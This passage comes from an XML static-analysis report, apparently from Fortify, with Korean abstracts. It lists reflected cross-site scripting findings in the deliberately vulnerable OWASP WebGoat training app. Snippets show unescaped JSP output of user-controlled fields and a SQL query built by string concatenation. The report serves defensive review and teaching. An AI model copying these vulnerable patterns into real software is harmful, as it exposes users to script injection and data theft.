<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EA39016909F45F53EEFCE398478A6CED" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ForgotPassword.java의 doStage3() 메서드가 195 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ForgotPassword.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ForgotPassword.java</FilePath>
<LineStart>195</LineStart>
<Snippet>	
		tr = new TR();
		tr.addElement(new TD().addElement(new StringElement("Color: " + COLOR_RESPONSE)));
		t.addElement(tr);
	</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="44FDD9D3ECD8BB124A2D2AE3DB505BFB" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드가 137 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>137</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY2", s.getParser()
			    .getStringParameter("QTY2", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY2", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="773BE44BF378A6613E29E708D582ADEC" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7A1FE9100716AD198373F83A841446B9" ruleID="798E4513-03B3-4252-A644-FBA596AEFB2B">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Screen.java의 output() 메서드가 261 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Screen.java</FilePath>
<LineStart>261</LineStart>
<Snippet>	// otherwise we're doing way too much SSL encryption work

	out.print(content.toString());

    }</Snippet>
<TargetFunction>java.io.PrintWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E376F8525E29E3CB8B65C5F0B5983D7" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 40 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>40</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DF0C79D62A42401F0E15A40E14159DC6" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6D92001949E38C502CCB91BFF6DA8F96" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 45 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>45</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1F4D8999288D6DA8B7B5B087BF56236C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 163 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>163</LineStart>
<Snippet>			    {
			    	%&gt;
			    	&lt;div id="reset" class="info"&gt;&lt;a href="&lt;%=webSession.getRestartLink()%&gt;"&gt;Restart this Lesson&lt;/a&gt;&lt;/div&gt;
	    			&lt;%
	    			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>472</LineStart>
<Snippet>			parameters.add(SCREEN + "=" + screenValue);
		
		String menuValue = request.getParameter(MENU);
		if (menuValue != null)
			parameters.add(MENU + "=" + menuValue);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9FFBED3819292A31FF2F6BF30216DE53" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AE94A31C91662ECB432177A55A9AF8CA" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 95 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>95</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B3487FE513D17B392D49D97E04467D8B" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UncheckedEmail.java의 createContent() 메서드가 159 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UncheckedEmail.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/UncheckedEmail.java</FilePath>
<LineStart>159</LineStart>
<Snippet>			.addElement(new Center()
				.addElement(new B()
					.addElement("You sent the following message to: "
						+ to)));
		ec.addElement(new BR());</Snippet>
<TargetFunction>org.apache.ecs.html.B.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EC769DAB52FA9868AFC13BA24D450E13" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EEC853E23854174F9A6951A9CC55840E" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 makeParamDump_DELETEME() 메서드가 872 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>872</LineStart>
<Snippet>	{
	    String str = (String) i.next();
	    list.addElement(new LI(str));
	}
</Snippet>
<TargetFunction>org.apache.ecs.html.LI.LI()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>593</LineStart>
<Snippet>	}

	return request.getParameterValues(name);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6999DE3FC99AF2500FE3F95C518BC7D3" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BackDoors.java의 makeUsername() 메서드가 235 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>235</LineStart>
<Snippet>	String formattedInput = "&lt;span class='myClass'&gt;" + userInput
		+ "&lt;/span&gt;";
	ec.addElement(new Div(SELECT_ST + formattedInput));

	Input b = new Input();</Snippet>
<TargetFunction>org.apache.ecs.html.Div.Div()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D2836821BE6AC73E4E0A0C5EA4545774" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="45C3F501DE740E33705D6200C71D4B30" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2753C707CAEABEB5BB2920779FE6C496" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPhoneNumber()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="057FA090F3E04F924CF45792ACE35B5B" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 93 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>93</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F98277D438C51E36A84B6556C86B46AB" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2B2E80C3F1C5324EC70FFBD406310CAB" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>154</LineStart>
<Snippet>	    TextArea input2 = new TextArea("field2", 1, 25).addElement(param2);
	    TextArea input3 = new TextArea("field3", 1, 25).addElement(param3);
	    TextArea input4 = new TextArea("field4", 1, 25).addElement(param4);
	    TextArea input5 = new TextArea("field5", 1, 25).addElement(param5);
	    TextArea input6 = new TextArea("field6", 1, 25).addElement(param6);</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E37E79651849FC3D1A90C1ABAD6E637D" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 makeParamDump_DELETEME() 메서드가 872 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>872</LineStart>
<Snippet>	{
	    String str = (String) i.next();
	    list.addElement(new LI(str));
	}
</Snippet>
<TargetFunction>org.apache.ecs.html.LI.LI()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>576</LineStart>
<Snippet>	}

	return request.getParameterNames();
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CAEF78F7ACB495B39AA41859B49D818E" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SqlStringInjection.java의 injectableQuery() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>105</LineStart>
<Snippet>	    String query = "SELECT * FROM user_data WHERE last_name = '"
		    + accountName + "'";
	    ec.addElement(new PRE(query));

	    try</Snippet>
<TargetFunction>org.apache.ecs.html.PRE.PRE()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D782FCFF5041CA54AC9CBC048DBAD5C1" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
